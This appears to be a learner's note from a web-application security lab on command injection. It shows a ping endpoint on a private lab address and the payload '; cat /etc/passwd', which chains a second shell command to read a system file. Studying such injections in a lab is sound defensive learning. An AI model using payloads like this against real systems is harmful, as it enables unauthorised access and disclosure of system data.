# Commands Injection

Refer to Reconnissance{link} for file and command knowledge.
## Example 1 - ping through URL

`http://172.16.219.145/commandexec/example1.php?ip=127.0.0.1`
- this site returns the following to the webpage

![[Pasted image 20250413190446.png]]

- we can assume everything after `ip=` is executed in the Linux shell as follows

```bash
ping <user_input>
```

### Payload

`; cat /etc/passwd`
- `;` lets us inject another command besides pinging

<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413192615.png" width="600"/>

